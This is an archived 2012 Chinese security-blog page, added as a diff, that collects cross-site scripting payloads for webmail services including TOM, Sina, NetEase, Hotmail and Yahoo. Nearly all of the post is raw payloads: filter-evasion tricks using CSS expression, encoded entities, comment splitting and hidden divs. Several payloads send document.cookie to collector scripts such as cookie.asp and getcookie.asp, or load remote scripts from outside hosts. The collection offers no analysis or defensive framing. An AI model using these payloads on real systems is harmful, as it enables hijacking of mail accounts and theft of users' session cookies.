@@ -1,0 +1,1783 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>邮箱跨站代码收集 - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="Nuclear&#39;Atk" /><meta name="description" content="邮箱跨站代码收集" />
+<meta name="keywords" content="邮箱跨站代码收集" />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/3167/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="邮箱跨站代码收集" />
+<meta property="og:description" content="邮箱跨站代码收集" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/3167/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2012-12-17T20:00:13&#43;08:00" />
+<meta property="article:modified_time" content="2012-12-17T20:00:13&#43;08:00" />
+
+<meta itemprop="name" content="邮箱跨站代码收集">
+<meta itemprop="description" content="邮箱跨站代码收集"><meta itemprop="datePublished" content="2012-12-17T20:00:13&#43;08:00" />
+<meta itemprop="dateModified" content="2012-12-17T20:00:13&#43;08:00" />
+<meta itemprop="wordCount" content="3511">
+<meta itemprop="keywords" content="代码,跨站,邮箱,app,ASP,Cmd,cookie,CSS,exe,EXP,Google,Hack,Html,HTTP,IE,IP,Java,js,Jsp,Microsoft,NDS,Putty,SEO,Shell,URL,VB,VBS,Windows,XSS,浏览器," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="邮箱跨站代码收集"/>
+<meta name="twitter:description" content="邮箱跨站代码收集"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">邮箱跨站代码收集</h1>
+      
+      <div class="post-meta">
+        <time datetime="2012-12-17" class="post-time">
+          2012-12-17
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/%E4%BB%A3%E7%A0%81/"> 代码 </a>
+            <a href="https://lcx.cc/categories/%E8%B7%A8%E7%AB%99/"> 跨站 </a>
+            <a href="https://lcx.cc/categories/%E9%82%AE%E7%AE%B1/"> 邮箱 </a>
+            
+          </div>
+        <span class="more-meta"> 约 3511 字 </span>
+          <span class="more-meta"> 预计阅读 8 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<pre class="prettyprint lang-html">&lt;script&gt;alert("dddd")&lt;script&gt;
+
+&lt;script&gt;alert('test')&lt;/script&gt;
+
+----------------------------TOM-------------------------------------------------------------------
+&lt;img src="http://www.google.cn/intl/zh-CN/images/logo_cn.gif" width=0 height=0 ononloadload="alert(52)"&gt;52
+&lt;img src="http://www.google.cn/intl/zh-CN/images/logo_cn.gif" width=0 height=0 onload="alert(53)"&gt;53
+&lt;img src="http://www.google.cn/intl/zh-CN/images/logo_cn.gif" width=0 height=0 /**/onload="alert(54)"&gt;54
+&lt;ba="&lt;script&gt;alert(55);&lt;/script&gt;"55
+&lt;img/*****/src=# width=0 height=0 /***/onerror=alert(56)&gt;56
+&lt;iframe/**/src=http://www.baidu.com&gt;57&lt;/iframe&gt;
+&lt;img src=http://www.google.cn/intl/zh-CN/images/logo_cn.gif onreadystatechange=alert(58)&gt;58
+&lt;image src=http://www.google.cn/intl/zh-CN/images/logo_cn.gif onreadystatechange=alert(59)&gt;59
+&lt;style onreadystatechange=alert(60)&gt;60&lt;/style&gt;
+&lt;xml onreadystatechange=alert(61)&gt;xxxx&lt;/xml&gt;61
+&lt;object type=image src=http://www.google.cn/intl/zh-CN/images/logo_cn.gif onreadystatechange=alert(62)&gt;62
+&lt;img type=image src=http://www.google.cn/intl/zh-CN/images/logo_cn.gif onreadystatechange=alert(63)&gt;63
+&lt;P STYLE="behavior:url('#default#time2')" onEnd=alert(64)&gt;64
+&lt;P STYLE="behavior:url('#default#time2')" onBegin=alert(65)&gt;65
+&lt;style&gt;&lt;img src="&lt;/style&gt;&lt;img src=x onerror=alert(66)//"&gt;66
+
+----------------------------------------------------------------------------------------------
+
+&lt;DIV STYLE="background-image:\0075\0072\006C\0028\006A\0061\0076\0061\0073\0063\0072\0069\0070\0074\003A\0061\006C\0065\0072\0074\0028\002F\0078\0073\0073\002F\0029\0029"&gt;
+
+&lt;frameset onload=alert(1)&gt;
+
+
+&lt;IMG SRC="jav	ascript:alert('XSS-1');"&gt;
+
+
+&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS-2")&lt;/SCRIPT&gt;"&gt;
+
+
+Hello,80sec  &lt;/xss style="x:expression(alert(document.cookie))"&gt;
+
+
+&lt;IMG
+SRC
+=
+"
+j
+a
+v
+a
+s
+c
+r
+i
+p
+t
+:
+a
+l
+e
+r
+t
+(
+'
+X
+S
+S
+'
+)
+"
+&gt;
+
+
+
+&lt;img src=http://mail.yimg.com/nq/mc/1_0_0/us/pim/mail/neutral.gif onLoad=alert(/xss-3/);&gt;
+
+
+
+&lt;img src="javascrip&amp;#116&amp;#58alert(/xss-4/)" width=100&gt;
+
+
+&lt;img src="#" style="Xss:expression(alert(/xss-5/));"&gt;
+
+
+&lt;style&gt;
+input {;a:e/*t*/x/*y*/p/*m*/r/*k*/e/*l*/s/*p*/s/*h*/i/*p*/o/*f*/n(alert(/xxx/))
+&lt;/style&gt;  
+&lt;input type="text"&gt;
+
+
+&lt;style&gt;
+a {;a:e/*t*/x/*y*/p/*m*/r/*k*/e/*l*/s/*p*/s/*h*/i/*p*/o/*f*/n(alert(/xxx/))
+&lt;/style&gt;
+&lt;a&gt;&lt;/a&gt;
+
+
+&lt;marquee style="background-color:red" onstart="alert('monyer')" &gt;asdf&lt;/marquee&gt;
+
+
+
+&lt;div&gt;\n&lt;marquee style=\"BACKGROUND-COLOR:red;\" onstart="alert('monyer')"\n&gt;asdf&lt;\/marquee&gt;&lt;\/div&gt;
+
+
+&lt;img src=&lt;marquee style="background-color:red" onstart="alert('monyer')"  onerror=alert(/XSS-6/)&gt;&gt;&lt;/marquee&gt;
+
+&lt;img src=&lt;marquee style="background-color:red" onstart="alert('monyer')"  onerror=onerror=alert(/XSS-7/)&gt;&gt;&lt;marquee&gt;
+
+&lt;img src=&lt;marquee style="background-color:red" onstart="alert(/"/")  onerror=onerror=alert(/XSS-8/)&gt;&gt;&lt;marquee&gt; 
+这个新浪只差一个"闭合了
+
+
+
+
+&lt;img src="&lt;marquee style="background-color:red" onstart="alert("(")  onerror=onerror=alert(/XSS-9/)&gt;&gt;&lt;marquee&gt;
+
+
+
+
+&lt;img src=" http://xss.jpg"“‘； onerror=alert('onerror=')&gt;
+这个新浪不让加入
+
+
+&lt;img src=" http://xss.jpg" onerror=alert('onerror=')&gt;
+
+
+
+&lt;img src=" http://xss.jpg" style=\"BACKGROUND-COLOR:red;\" onerror=alert('onerror=')&gt;
+
+
+
+&lt;DIV style="xss:ex/*ss*/pression(alert('http://hi.baidu.com/ycosxhack'))"&gt;&lt;/DIV&gt;
+
+
+
+&lt;img src=" http://xss.jpg" onerror=alert('XSS-10')&gt;
+
+
+
+&lt;IMG onerror="alert('XSS-11')" src=" http://xss.jpg"&gt;
+
+
+
+&lt;img src=http onerror=alert(/XSS-12/)&gt;
+
+
+
+
+&lt;div style="background-color:red" onmouseenter="alert('monyer')"&gt;123456&lt;/div&gt;
+
+
+
+
+
+&lt;HTML&gt;&lt;HEAD&gt;
+&lt;/HEAD&gt;
+&lt;BODY&gt;
+&lt;P&gt;参加&lt;/P&gt;
+&lt;div id="nini" style="display:none"&gt;window.xx=2;var f=document.createElement('script');f.src='http://www.mail-query.com/test.js'.replace(/!/g,String.fromCharCode(38));document.getElementsByTagName('head')[0].appendChild(f)&lt;/div&gt;&lt;style&gt;&lt;!--a{font-size:14px;font-family:arial,verdana,sans-serif;&lt;/style&gt;&lt;div&gt;;a:e/*t*/x/*y*/p/*m*/r/*k*/e/*l*/s/*p*/s/*h*/i/*p*/o/*f*/n(window.xx!=2?eval(nini.innerHTML):1);&lt;/div&gt;&lt;style&gt;}--&gt;&lt;/style&gt;&lt;a&gt;&lt;/a&gt;&lt;img width="1" height="1" src="http://www.mail-query.com/test.js"&gt;
+&lt;/BODY&gt;&lt;/HTML&gt;
+
+网易最新的xss
+
+
+
+
+
+
+&lt;script defer="defer"&gt;var a,b,c,d,e;a="http:";b="//";c="www";d=".baidu";e=".com";window.open(a+b+c+d+e,"","toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,width=500,height=500");&lt;/script&gt;
+
+
+---------
+
+
+&lt;div id="aaa" style="display:none"&gt;&lt;/div&gt;
+&lt;div id="llyy" style="display:none"&gt;
+if(parent.window.x!='1')
+{
+	var script1 = parent.document.createElement('script');
+	script1.id='script1';
+	script1.src='http://www.mail-query.com/test.js';
+	parent.document.body.appendChild(script1);
+}
+&lt;/div&gt;
+&lt;HTML XMLNS:t="urn:schemas-microsoft-com:time"&gt;
+&lt;div&gt;1&lt;t:animate style="behavior:url(#default#time2)" attributename=innerhtml values=&amp;lt;img/src=`.`style=`display:none`onerror=eval(llyy.innerHTML)&amp;gt;&gt;&lt;/div&gt;
+
+
+
+---------
+
+
+
+
+&lt;div id="aaa" style="display:none"&gt;&lt;/div&gt;
+&lt;div id="llyy" style="display:none"&gt;
+if(parent.window.x!='1')
+{
+	var script1 = parent.document.createElement('script');
+	script1.id='script1';
+	script1.src='http://www.mail-query.com/test.js';
+	parent.document.body.appendChild(script1);
+}
+&lt;/div&gt;
+&lt;HTML XMLNS:t="urn:schemas-microsoft-com:time"&gt;
+&lt;div&gt;1&lt;t:animate style="behavior:url(#default#time2)" /*t*/attributename=innerhtml values=&amp;lt;img/src=`./*t*//*t*//*t*//*t*//*t*/`style=`display:none`/*t*/onerror=/*t*/eval/*t*/(/*t*/llyy.innerHTML)&amp;gt;&gt;&lt;/div&gt;
+
+---------
+
+&lt;div id="aaa" style="display:none"&gt;&lt;/div&gt;
+&lt;div id="llyy" style="display:none"&gt;
+if(parent.window.x!='1')
+{
+	var script1 = parent.document.createElement('script');
+	script1.id='script1';
+	script1.src='http://www.mail-query.com/test.js';
+	parent.document.body.appendChild(script1);
+}
+&lt;/div&gt;
+&lt;HTML /*t*/XMLNS:t="urn:schemas-microsoft-com:time"&gt;
+&lt;div&gt;1&lt;t:animate style="/*t*/behavior/*t*/:/*t*/url(/*t*/#default#time2)" /*t*/attributename=innerhtml values=&amp;lt;img/src=`./*t*//*t*//*t*//*t*//*t*/`style=`display:none`/*t*/onerror=/*t*/eval/*t*/(/*t*/llyy.innerHTML)&amp;gt;&gt;&lt;/div&gt;
+
+---------
+&lt;div id="aaa" style="display:none"&gt;&lt;/div&gt;
+&lt;div id="llyy" style="display:none"&gt;
+if(parent.window.x!='1')
+{
+	var script1 = parent.document.createElement('script');
+	script1.id='script1';
+	script1.src='http://www.mail-query.com/test.js';
+	parent.document.body.appendChild(script1);
+}
+&lt;/div&gt;
+&lt;HTML /*t*/XMLNS:t/*t*/=/*t*/"urn:schemas-microsoft-com:time"/*t*/&gt;
+&lt;div&gt;1&lt;t:animate style="/*t*/behavior/*t*/:/*t*/url(/*t*/#default#time2)" /*t*/attributename=innerhtml values=&amp;lt;img/src=`./*t*//*t*//*t*//*t*//*t*/`style=`/*t*/display:none/*t*/`/*t*/onerror=/*t*/eval/*t*/(/*t*/llyy.innerHTML)&amp;gt;&gt;&lt;/div&gt;
+
+---------
+
+&lt;div id="aaa" style="display:none"&gt;&lt;/div&gt;
+&lt;div id="llyy" style="display:none"&gt;
+if(parent.window.x!='1')
+{
+	var script1 = parent.document.createElement('script');
+	script1.id='script1';
+	script1.src='http://www.mail-query.com/test.js';
+	parent.document.body.appendChild(script1);
+}
+&lt;/div&gt;
+&lt;HTML /*t*///fuckyou///\/XMLNS:t/*t*/=/*t*/"urn:schemas-microsoft-com:time"/*t*/&gt;
+&lt;div&gt;1&lt;t:animate style="/*t*/behavior/*t*/:/*t*/url(/*t*/#default#time2)" /*t*/attributename=innerhtml values=&amp;lt;img/src=`onerror.eval\/\/\/\/\/\/\/\/\/\/\/\\/\/\/\/\////////////////////*t*//*t*//*t*//*t*//*t*/`style=`/*t*/display:none/*t*/`/*t*/onerror=/*t*/eval/*t*/(/*t*/llyy.innerHTML)&amp;gt;&gt;&lt;/div&gt;
+
+---------
+&lt;div style=width:1px;filter:glow onfilterchange=alert(1)&gt;x
+
+
+
+&lt;!--&lt;img src="--&gt;&lt;img src=x onerror=alert(1)//"&gt;
+
+
+
+&lt;comment&gt;&lt;img src="&lt;/comment&gt;&lt;img src=x onerror=alert(1)//"&gt;
+
+
+
+&lt;style&gt;&lt;img src="&lt;/style&gt;&lt;img src=x onerror=alert(1)//"&gt;
+
+
+
+&lt;x '="foo"&gt;&lt;x foo='&gt;&lt;img src=x onerror=alert(1)//'&gt;
+
+
+---------
+
+&lt;a href="javascript#[code]"&gt;
+&lt;div &gt;
+&lt;img src="javascript:[code]"&gt;
+&lt;img tdynsrc="javascript;[code]"&gt; [IE浏览器]
+&lt;input type="imge" dynsrc="javascript;[code]"&gt; [IE浏览器]
+&lt;bagsound src="javascript;[code]"&gt; [IE浏览器]
+&amp;&lt;script&gt;[code]&lt;/script&gt;
+&amp;{[code]} [N4浏览器]
+&lt;img src=&amp;{[code]};&gt;
+&lt;link rel="stylesheet" herf="javascript;[code]"&gt;
+&lt;iframe src="vbscript:[code]"&gt; [IE浏览器]
+&lt;img src="mocha:[code]"&gt; [N4浏览器]
+&lt;img src="livescript:[code]"&gt; [N4浏览器]
+&lt;div style="behaviour:url([link to code])"&gt; [IE浏览器]
+&lt;div style="binding:url([link to code])"&gt; [Mozilla浏览器]
+&lt;div style="width:expression([code]);"&gt; [IE浏览器]
+&lt;object classid="clsid:..." codebase="javascript:[code]"&gt; [IE浏览器]
+[\xCO][\xBC]script&gt;[code][\xCO][\xBC]/script&gt; [UTF-8;IE;Opera浏览器]
+   &lt;a href="javascript#[code]"&gt;
+   &lt;div onmouseover="[code]"&gt;
+   &lt;img src="javascript:[code]"&gt;
+   &lt;img dynsrc="javascript:[code]"&gt; [IE]
+   &lt;input type="image" dynsrc="javascript:[code]"&gt; [IE]
+   &lt;bgsound src="javascript:[code]"&gt; [IE]
+   &amp;&lt;script&gt;[code]&lt;/script&gt;
+   &amp;{[code]}; [N4]
+   &lt;img src=&amp;{[code]};&gt; [N4]
+   &lt;link rel="stylesheet" href="javascript:[code]"&gt;
+   &lt;iframe src="vbscript:[code]"&gt; [IE]
+   &lt;img src="mocha:[code]"&gt; [N4]
+   &lt;img src="livescript:[code]"&gt; [N4]
+   &lt;a href="about:&lt;script&gt;[code]&lt;/script&gt;"&gt;
+   &lt;meta http-equiv="refresh" content="0;url=javascript:[code]"&gt;
+   &lt;body onload="[code]"&gt;
+   &lt;div style="background-image: url(javascript:[code]);"&gt;
+   &lt;div style="behaviour: url([link to code]);"&gt; [IE]
+   &lt;div style="binding: url([link to code]);"&gt; [Mozilla]
+   &lt;div style="width: expression([code]);"&gt; [IE]
+   &lt;style type="text/javascript"&gt;[code]&lt;/style&gt; [N4]
+   &lt;object classid="clsid:..." codebase="javascript:[code]"&gt; [IE]
+   &lt;style&gt;&lt;!--&lt;/style&gt;&lt;script&gt;[code]//--&gt;&lt;/script&gt;
+   &lt;![CDATA[&lt;!--]]&gt;&lt;script&gt;[code]//--&gt;&lt;/script&gt;
+   &lt;!-- -- --&gt;&lt;script&gt;[code]&lt;/script&gt;&lt;!-- -- --&gt;
+   &lt;script&gt;[code]&lt;/script&gt;
+   &lt;img src="blah"onmouseover="[code]"&gt;
+   &lt;img src="blah&gt;" onmouseover="[code]"&gt;
+   &lt;xml src="javascript:[code]"&gt;
+   &lt;xml id="X"&gt;&lt;a&gt;&lt;b&gt;&lt;script&gt;[code]&lt;/script&gt;;&lt;/b&gt;&lt;/a&gt;&lt;/xml&gt;
+   &lt;div datafld="b" dataformatas="html" datasrc="#X"&gt;&lt;/div&gt;
+   [\xC0][\xBC]script&gt;[code][\xC0][\xBC]/script&gt; [UTF-8; IE, Opera]
+
+
+
+
+&lt;IFRAME SRC="http://www.baidu.com/"&gt;&lt;/IFRAME&gt;
+&lt;script&gt;alert('dddd')&lt;script&gt;
+
+
+&amp;nbsp;
+&amp;lt;
+&amp;#39;
+
+
+
+&lt;style&gt;*{x:ｅｘｐｒｅｓｓｉｏｎ(if(x!=1){alert(1);x=1;})}&lt;/style&gt;
+&lt;img lowsrc= "javascript:alert('xss-13')"&gt;
+
+&lt;script&gt;
+img = new Image(); img.src = "http://127.0.0.1/cookie.asp?cookie="+document.cookie;img.width=0;img.height=0
+&lt;/script&gt;
+
+&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS-14")';&lt;/STYLE&gt;
+&lt;img src="#" style="Xss:expression(alert('xss-15'));"&gt; 
+&lt;img src="javascript:alert(/xss-16/)"&gt; 
+&lt;table background="javascript:alert(/xss-17/)"&gt;&lt;/table&gt;
+&lt;img src="vbscript:msgbox(&amp;quot;a&amp;quot;)"&gt;
+
+
+&lt;img src=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x77&amp;#x77&amp;#x77&amp;#x2E&amp;#x68&amp;#x61&amp;#x63&amp;#x6B&amp;#x6D&amp;#x2E&amp;#x63&amp;#x6F&amp;#x6D&amp;#x27&amp;#x29&gt;
+
+&lt;img src=j&amp;#x09;ava&amp;#x09;script:wi&amp;#x09;ndow.op&amp;#x09;en('http://www.hackm.com')&gt;
+&lt;img src=javascript:document.write('&lt;Iframe%20src=http://hi.baidu.com/jc123%20width=500%20height=550%3E&lt;/iframe%3E')&gt; 
+&lt;img src=javascript:document.write('%3CIframe%20src=http://hi.baidu.com/jc123%20width=500%20height=550%3E%3C/iframe%3E')&gt;
+&lt;img src=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x64ocument&amp;#x2ewrite&amp;#x28&amp;#x27&amp;#x3cIframe%20src=http://hi.baidu.com/jc123%20width=500%20height=550%3E&amp;#x3c/iframe%3E')&gt;
+&lt;script&gt;window.location=('http://www.baidu.com/')&lt;/script&gt;
+&lt;img src="/BLOG/javascript:document.write"('&lt;Iframe%20src=http://www.baidu.com%20width=500%20height=550%3E&lt;/iframe%3E')&gt;
+&lt;img src=j avascript:document.write('%3CIframe%20src=http://www.baidu.com%20width=500%20height=550%3E%3C/iframe%3E')&gt;
+&lt;img src="/BLOG/&amp;";#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp; #x70&amp;#x74&amp;#x3A&amp;#x64ocument&amp;#x2ewrite&amp;#x28&amp;#x27&amp; #x3cIframe%20src=http://www.baidu.com%20width=500%20height=550%3E&amp;#x3c/iframe% 3E')&gt;
+
+&lt;body onload='window.open("http://www.baidu.com")'&gt;
+
+&lt;body onload='&amp;#119;&amp;#105;&amp;#110;&amp;#100;&amp;#111;&amp;#119;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;("&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#98;&amp;#97;&amp;#105;&amp;#100;&amp;#117;&amp;#46;&amp;#99;&amp;#111;&amp;#109;")'&gt;
+
+&lt;meta http-equiv="refresh" content="0;url=http://www.baidu.com"&gt;
+
+&lt;img dynsrc=javascript:alert("hi,163")&gt;
+
+&lt;img dynsrc=javascript:window.location.href='http://yourwebsite.com/getcookie.asp?msg='+document.cookie&gt;。
+
+&lt;marquee onstart="alert(/xss-18/)"&gt;.&lt;/marquee&gt;
+
+前段时间被过滤的hotmail跨站代码
+&lt;font color="ffffff"&gt; &lt;div id="jmp" style="display:none"&gt;nop&lt;/div&gt;&lt;div id="ly" style="display:none"&gt;function ok(){return true};window.onerror=ok&lt;/div&gt;&lt;div id="tip" title="&lt;a style="display:none"&gt;" style="display:none"&gt;&lt;/div&gt;&lt;div id="tap" title="&lt;" style="display:none"&gt;&lt;/div&gt;&lt;div id="tep" title="&gt;" style="display:none"&gt;&lt;/div&gt;&lt;style&gt;div{background-image:expression(javascript:1?document.write(EC_tip.title+';top:'+EC_tap.title+'/a'+EC_tep.title+EC_tap.title+'script id=nop'+EC_tep.title+EC_ly.innerHTML+EC_tap.title+'/script'+EC_tep.title+EC_tap.title+'script src=http://xxx.com/test/index.asp?uid=someone@hotmail.com'+EC_tep.title+EC_tap.title+'/script'+EC_tep.title):1=1);}&lt;/style&gt;&lt;/font&gt;
+
+&lt;font color="ffffff"&gt;
+&lt;div id="jmp" style="display:none"&gt;nop&lt;/div&gt;
+&lt;div id="ly" style="display:none"&gt;
+function ok()
+{
+return true
+};
+window.onerror=ok&lt;/div&gt;
+&lt;div id="tip" title="&lt;a style="display:none"&gt;" style="display:none"&gt;&lt;/div&gt;
+&lt;div id="tap" title="&lt;" style="display:none"&gt;&lt;/div&gt;
+&lt;div id="tep" title="&gt;" style="display:none"&gt;&lt;/div&gt;
+&lt;style&gt;div{background-image:expression(javascript:1?document.write(EC_tip.title+';top:'+EC_tap.title+'/a'+EC_tep.title+EC_tap.title+'script id=nop'+EC_tep.title+EC_ly.innerHTML+EC_tap.title+'/script'+EC_tep.title+EC_tap.title+'script src=http://xxx.com/test/index.asp?uid=someone@hotmail.com'+EC_tep.title+EC_tap.title+'/script'+EC_tep.title):1=1);}&lt;/style&gt;
+&lt;/font&gt;
+
+
+
+
+
+&lt;STYLE type=text/css&gt;BODY {
+	BACKGROUND-IMAGE: url(expression:(javascript:alert('xss-19');); ); MARGIN: 0px; BACKGROUND-COLOR: #a00000
+}
+TD {
+	FONT-SIZE: 12px; COLOR: #ffdfad; LINE-HEIGHT: 20px
+}
+A {
+	FONT-SIZE: 12px; COLOR: #000000; TEXT-DECORATION: none
+}
+A:hover {
+	FONT-SIZE: 12px; COLOR: #ffff00; TEXT-DECORATION: underline
+}
+&lt;/STYLE&gt;
+
+
+
+
+&lt;style&gt;BR{top:rgb('88',80,'180);top:rgb(') !important height:exPrEsSiOn((window.rrr==123)?xxx=8:(eval(code.title)==20088) || (rrr=123))}',80,'180);}&lt;/style&gt;
+
+
+
+
+
+&lt;div id="xxx" style="DISPLAY: none" title="try{window['on'+'error']=function(){return true;};if(window.ufoufoufo!=1){framedir='http://xxxxx.196/';xyzxyz=document.createElement('SCRIPT');xyzxyz.src=framedir+'yahoo/time.asp?uid=xxxxx';document.getElementsByTagName('head')[0].appendChild(xyzxyz);ufoufoufo=1;}}catch(e){}"&gt;.&lt;/div&gt;&lt;div style="DISPLAY: none"&gt;&lt;img lang="HTML" id="inner" title="&lt;img onerror=window['eva'+'l'](document.getElementById('xxx').title); src=http://#&gt;" width=0 src="http://#" style="background:`url(http:// onerror=this.parentNode[this.id+this.lang]=this.title;//)`"&gt;&lt;/div&gt; 
+
+
+
+
+&lt;IMG SRC=”javascript:alert(‘XSS-20’);”&gt;
+&lt;IMG SRC=javascript:alert(‘XSS-21’)&gt;
+&lt;IMG SRC=”javascript:alert(String.fromCharCode(88,83,83))”&gt;
+&lt;IMG SRC=”jav ascript:alert(‘XSS-22’);”&gt;
+&lt;SCRIPT/XSS SRC=”http://example.com/xss.js”&gt;&lt;/SCRIPT&gt;
+&lt;&lt;SCRIPT&gt;alert(“XSS-23”);//&lt;&lt;/SCRIPT&gt;
+&lt;iframe src=http://example.com/scriptlet.html &lt;
+&lt;INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS-24’);”&gt;
